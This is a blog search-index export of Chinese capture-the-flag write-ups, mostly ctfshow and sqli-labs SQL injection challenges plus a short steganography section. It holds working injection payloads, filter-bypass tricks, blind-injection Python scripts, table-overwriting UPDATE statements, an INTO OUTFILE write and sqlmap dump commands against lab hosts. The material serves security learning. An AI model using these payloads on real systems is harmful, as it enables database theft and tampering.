<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshow-web入门-sql注入</title>
    <url>/2023/01/17/ctfshow%E5%90%88%E9%9B%86-ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sql注入</p>
<span id="more"></span>

<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+    #万能密码</span><br></pre></td></tr></table></figure>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>字段数，可以使用，1’ order by 2 –+查询</p>
<p>过滤了回显，所以用一下 to_base64()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select to_base64(username),to_base64(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>变成3个字段，再加一个字段即可，表也改变了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,to_base64(username),to_base64(password) from ctfshow_user3 --+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://7b0eb295-d966-44a5-8d58-811a22a20cec.challenge.ctf.show//api/v4.php?id=1&#x27;&quot;</span><br><span class="line">uuid=string.ascii_lowercase+&quot;-&#125;&#123;&quot;+string.digits</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,46):</span><br><span class="line">    for j in uuid:</span><br><span class="line">        payload = &quot;and ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;) from &#123;0&#125; for 1))=&#123;1&#125;--%20&amp;page=1&amp;limit=10&quot;.replace(&quot; &quot;, &quot;/**/&quot;).format(i,ord(j))</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        if &quot;admin&quot; in res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>



<h2 id="web175-时间盲注"><a href="#web175-时间盲注" class="headerlink" title="web175-时间盲注"></a>web175-时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>Y4tacker师傅写的，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">  可能产生异常的代码块</span><br><span class="line">except [ (Error1, Error2, ... ) [as e] ]:</span><br><span class="line">  处理异常的代码块1</span><br><span class="line">except [ (Error3, Error4, ... ) [as e] ]:</span><br><span class="line">  处理异常的代码块2</span><br><span class="line">except [Exception]:</span><br><span class="line">  处理其它异常</span><br></pre></td></tr></table></figure>

<p>为防止服务器不能及时响应，大部分发至外部服务器的请求都应该带着 timeout 参数。在默认情况下，除非显式指定了 timeout 值，requests 是不会自动进行超时处理的。如果没有 timeout，你的代码可能会挂起若干分钟甚至更长时间。在爬虫代理这一块我们经常会遇到请求超时的问题，<strong>代码就卡在哪里，不报错也没有requests请求的响应。</strong></p>
<p>通常的处理是在requests.get()语句中加入timeout限制请求时间</p>
<p>解法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>访问1.txt即可</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web-179未写"><a href="#web-179未写" class="headerlink" title="web 179未写"></a>web 179未写</h2><h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>空格绕过</p>
<p>%0a %0b %0c %0d %09 注释&#x2F;**&#x2F; 括号等一些符号隔开</p>
<h2 id="web183-正则匹配"><a href="#web183-正则匹配" class="headerlink" title="web183-正则匹配"></a>web183-正则匹配</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>查询结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的题目，就睡一段</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.<a href="https://so.csdn.net/so/search?q=format%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">format函数</a>的语法及用法</p>
<p>（1）语法：’{}’.format()</p>
<p>（2）用法：用于格式化字符串。可以接受无限个参数，可以指定顺序。返回结果为字符串。</p>
<p>#默认顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;学习&#123;&#125;中的&#123;&#125;函数&#x27;.format(&#x27;python&#x27;,&#x27;format&#x27;)</span><br><span class="line">-&gt;&#x27;学习python中的format函数&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_50853979/article/details/125128977">https://blog.csdn.net/weixin_50853979/article/details/125128977</a></p>
<p><strong>正则表达式用来匹配文本的特殊的串（字符集合）（匹配文本，将一个模式（正则表达式）与一个文本串进行比较）</strong></p>
<p>LIKE 和 REGEXP之间的重要差别</p>
<p>LIKE 匹配整个列，如果被匹配的文本在列值中出现，LIKE 将不会找到它，相应的行也不会被返回（除非使用通配符）。而 REGEXP 在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP 将会找到它，相应的行将被返回，并且 REGEXP 能匹配整个列值（与 LIKE 相同的作用）</p>
<p>   反引号，一般在ESC键的下方。<strong>它是为了<strong><strong>区分</strong></strong>MYSQL的<strong><strong>保留字</strong></strong>与<strong><strong>普通字符</strong></strong>而引入的符号。</strong></p>
<p>MySQL里使用一对反勾号“ &#96; ”将识别符括起来，一般情况下可以不用，<strong>单是如果识别符出现关键字冲突或标识符的写法可能产生歧义的情况下就必须使用</strong>。</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">查询结果</span><br><span class="line"></span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>where、单双引号、反引号都被过滤了，但是本题没有过滤空格。<br> where可以用having代替，单双引号可以用 括号+十六进制。</p>
<p>having和where可以替换，但是having语句有使用条件</p>
<p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p>
<p>tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25</p>
<p>ctfshow{}转为16进制</p>
<p>上述脚本修改date即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>[SQL绕过]md5($str,true)类型绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/March97/article/details/81222922">(4条消息) sql注入：md5($password,true)_March97的博客-CSDN博客</a></p>
<p>抓包返回结果即可看到flag</p>
<h2 id="web188–MYSQL的弱比较"><a href="#web188–MYSQL的弱比较" class="headerlink" title="web188–MYSQL的弱比较"></a>web188–MYSQL的弱比较</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line">if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码检测</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码判断</span><br><span class="line">if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>用户登陆</p>
<p>用户名:   </p>
<p>密码:</p>
<p>对于username的绕过，一种是利用mysql里面的弱比较类型，字符串和数字比较时，字符串永远化作0</p>
<p>去比较，有点像php的比较一样，所以，这里可以用0绕过，还有一种就是通过逻辑，在运算的时候对 </p>
<p>|| ，一真则真，就绕过了。接下来就是php里面常见的intval()函数的绕过，password应该是字符开头</p>
<p>的数据，字符串会变0来进行这种弱比较，所以password也为0就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=0 </span><br><span class="line"></span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure>

<p>登录成功后</p>
<p>f12  crtl+r</p>
<p>打开网络api文件即使登陆后的文件</p>
<p>ctfshow{1374102b-8d14-4716-8f93-daba7274e984}</p>
<h2 id="web190-布尔盲注"><a href="#web190-布尔盲注" class="headerlink" title="web190-布尔盲注"></a>web190-布尔盲注</h2><p>布尔盲注，二分法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # 查数据库</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #查数据库</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # 查字段</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # 查flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;密码错误&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;update(ctfshow_user)set`username`=1;</span><br><span class="line">1;update(ctfshow_user)set`pass`=1;</span><br></pre></td></tr></table></figure>

<p>注入到用户名中</p>
<p>，密码为1，账号为1</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/api/index.php?id= --referer=&quot;http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/sqlmap.php&quot; --dump</span><br></pre></td></tr></table></figure>

<p>–dump显示所有字段</p>
<p>为啥是api 我也不懂d</p>
<p>注意没有referer否则爆不出来</p>
<p>ctfshow{b651c961-4e84-4d79-a08c-42114b092c45}</p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/api/ --data=&quot;id=1&quot; --referer=&quot;http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/sqlmap&quot; --dump</span><br></pre></td></tr></table></figure>

<p>注意是data别拼错了</p>
<p>ctfshow{165ee80d-8978-4e45-beb4-5e907b5fa988}</p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>–method&#x3D; 修改sqlmap的提交方式，以什么方式提交 </p>
<p>Content-Type：用于定义用户的浏览器或相关设备如何显示将要加载的数据，或者如何处理将要加载的数据</p>
<p>　　MIME：MIME类型就是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
<p>text&#x2F;html的意思是将文件的content-type设置为text&#x2F;html的形式，浏览器在获取到这种文件时会自动调用html的解析器对文件进行相应的处理。</p>
<p>text&#x2F;plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
<p>PUT提交方式要注意，修改headers为Content-Type: text&#x2F;plain，否则默认为表单发送，PUT请求接受不到.</p>
<p><a href="https://www.cnblogs.com/mmzuo-798/p/11634055.html">https://www.cnblogs.com/mmzuo-798/p/11634055.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --header=&quot;Content-Type:text/plain&quot; --referer=&quot;http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/sqlmap.php&quot; --dump --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p>ctfshow{af320e41-a9df-44e1-b286-3e61d4e4b33b}</p>
<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2>]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-misc入门</title>
    <url>/2023/01/20/ctfshow%E5%90%88%E9%9B%86-ctfshow-misc%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>zsteg安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gem install zsteg</span><br></pre></td></tr></table></figure>



<span id="more"></span>

<h1 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h1><p>binwalk-e 无法分离</p>
<p>foremost 分离打开output</p>
<p>发现图片</p>
<p>ctfshow{1df0a9a3f709a2605803664b55783687}</p>
<h1 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h1><p>binwalk 查看发现两个IDAT数据块</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>是PNG IDAT的可选压缩格式</p>
<p>用tweakpng</p>
<p>打开删除的一个IDAT</p>
<p>保存，或者按f7图片预览发现flag</p>
<p><code>ctfshow&#123;44620176948fa759d3eeafeac99f1ce9&#125;</code></p>
<h1 id="misc-18"><a href="#misc-18" class="headerlink" title="misc 18"></a>misc 18</h1><p>下载题目为.tif 文件</p>
<p>用 <code>exiftool</code> 查看图片.</p>
<p>参考文献。</p>
<p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793"> ctfshow-Misc入门_H3rmesk1t的博客-CSDN博客_ctfshowmisc入门</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-sqli-labs</title>
    <url>/2023/04/14/ctfshow%E5%90%88%E9%9B%86-ctfshow-sqli-labs/</url>
    <content><![CDATA[<p>​    sqli-labs</p>
<p>​    <span id="more"></span></p>
<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>字符型闭合</p>
<p>解法1</p>
<p>sqlmap 直接梭,但是sqlmap不利于sql注入学习所以之后还是打算用手注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --dbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --tables -D &#x27;ctfshow&#x27; --dump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;bbe97e6a-2992-4aa7-bc51-5a69cab6d0dc&#125;</span><br></pre></td></tr></table></figure>

<p>解法2</p>
<p>联合注入一下试试</p>
<p>只有一条回显所以</p>
<p>关于group_concat用法</p>
<p><img src="/2023/04/14/ctfshow%E5%90%88%E9%9B%86-ctfshow-sqli-labs/QQ%E6%88%AA%E5%9B%BE20230414171532.png"></p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test</p>
<p>查数据库ctfshow的表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;ctfshow&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>存在flag表格</p>
<p>查字段名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>id,flag</p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,flag from ctfshow.flag-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow{372292b7-6add-43c5-8c8c-e9a12c7de8a2}</p>
<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><p>数字类型闭合</p>
<p>-1’  换成-1 即可</p>
<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><p><code>&#39;)</code>闭合</p>
<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p><code>&quot;)</code>闭合单个双引号</p>
<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://690423f6-d413-4532-947c-1a665f81c17c.challenge.ctf.show/?id=1 --batch -D &#x27;ctfshow&#x27; --tables --dump</span><br></pre></td></tr></table></figure>

<p>ctfshow{aabc5665-5832-4732-b706-88340fc65f12}</p>
<p>学习一下怎末写脚本</p>
<p>测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure>

<p>回显You are in………..</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=2--+</span><br></pre></td></tr></table></figure>

<p>什么都没有，所以以此来写布尔脚本，加二分法，</p>
<p>加快盲注速度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://07371906-d627-47a3-8e98-d53834537006.challenge.ctf.show/?id=1%27and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpuck&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if &#x27;You are in...........&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>

<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2><p>闭合方式改变</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://96de8749-08e6-4e9c-b60a-c2e4b5c4cfa3.challenge.ctf.show:8080/?id=1%22and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpa&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if &#x27;You are in...........&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>



<h2 id="web523"><a href="#web523" class="headerlink" title="web523"></a>web523</h2><p>id&#x3D;1’ )) and 1&#x3D;1 –+ 正常显示–<strong>这里提示写文件outfile</strong><br> id&#x3D;1’ )) and 1&#x3D;2 –+ 报错</p>
